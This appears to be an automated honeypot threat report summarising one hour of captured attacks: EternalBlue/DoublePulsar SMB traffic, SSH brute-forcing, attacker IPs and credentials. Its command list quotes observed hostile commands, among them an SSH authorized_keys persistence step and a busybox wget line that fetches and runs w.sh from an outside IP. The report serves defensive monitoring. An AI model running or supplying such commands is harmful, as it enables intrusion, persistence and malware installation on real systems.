
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-05T09:01:30Z
**Timeframe:** 2025-10-05T08:20:01Z to 2025-10-05T09:00:01Z
**Log Files Analyzed:**
- agg_log_20251005T082001Z.json
- agg_log_20251005T084002Z.json
- agg_log_20251005T090001Z.json

---

### **Executive Summary**

This report summarizes 18,905 malicious events recorded by the honeypot network over the past hour. The majority of attacks were captured by the Dionaea honeypot, primarily targeting the SMB service on port 445. A significant volume of activity originated from a small set of IP addresses, with `103.17.91.37`, `42.112.80.183`, and `189.27.133.195` being the most persistent attackers. A high number of alerts for the "DoublePulsar Backdoor" were triggered, indicating attempts to exploit the EternalBlue vulnerability. Additionally, multiple brute-force attempts and command-and-control activities were observed, including efforts to install malicious SSH keys.

---

### **Detailed Analysis**

**Attacks by Honeypot**
- **Dionaea:** 8,322
- **Cowrie:** 4,554
- **Suricata:** 2,346
- **Mailoney:** 1,636
- **Ciscoasa:** 1,535
- **Sentrypeer:** 221
- **Honeytrap:** 78
- **Redishoneypot:** 66
- **H0neytr4p:** 52
- **Miniprint:** 27
- **Honeyaml:** 23
- **Adbhoney:** 17
- **Tanner:** 19
- **ElasticPot:** 5
- **Dicompot:** 2
- **ConPot:** 1
- **Ipphoney:** 1

**Top Attacking IPs**
- 103.17.91.37
- 42.112.80.183
- 189.27.133.195
- 49.205.182.186
- 86.54.42.238
- 176.65.141.117
- 45.205.22.34
- 179.48.54.162
- 203.128.8.16
- 217.154.35.203
- 138.124.186.209
- 80.97.160.168
- 119.195.90.64
- 104.164.110.31
- 198.12.68.114

**Top Targeted Ports/Protocols**
- 445
- 25
- 22
- 5060
- TCP/445
- 6379
- 443
- UDP/5060
- TCP/5900
- 80
- 9100

**Most Common CVEs**
- CVE-2005-4050
- CVE-2021-3449
- CVE-2019-11500
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2006-2369

**Commands Attempted by Attackers**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `crontab -l`
- `uname -a`
- `whoami`
- `w`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://89.144.20.51/w.sh; sh w.sh; ...`

**Signatures Triggered**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET VOIP MultiTech SIP UDP Overflow
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP (various groups)

**Users / Login Attempts (user/pass)**
- 345gs5662d34/345gs5662d34
- novinhost/novinhost.org
- root/3245gs5662d34
- test/zhbjETuyMffoL8F
- root/LeitboGi0ro
- root/2glehe5t24th1issZs
- root/nPSpP4PBW0

**Files Uploaded/Downloaded**
- wget.sh;
- w.sh;
- c.sh;

**HTTP User-Agents**
- (No significant user agents recorded in this period)

**SSH Clients and Servers**
- (No significant clients or servers recorded in this period)

**Top Attacker AS Organizations**
- (No AS organizations recorded in this period)

---

### **Key Observations and Anomalies**

- **High Volume of SMB Exploitation:** The overwhelming number of events targeting port 445, combined with the "DoublePulsar Backdoor" signature, strongly indicates widespread, automated attempts to exploit the EternalBlue (MS17-010) vulnerability.
- **Concentrated Attack Sources:** A few IP addresses were responsible for a disproportionately large number of attacks. This pattern suggests targeted campaigns or the use of compromised machines as attack platforms. The top 3 IPs account for over 42% of the total recorded events.
- **Persistent SSH Credential Stuffing:** Attackers consistently attempted to gain access via SSH, using a common set of credentials. The subsequent commands show a clear playbook: remove existing SSH configurations and install a malicious public key to maintain persistence.
- **Downloader and Dropper Activity:** The appearance of commands using `wget` and `curl` to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) from a remote server (89.144.20.51) signifies attempts to install malware or establish a botnet presence.

---
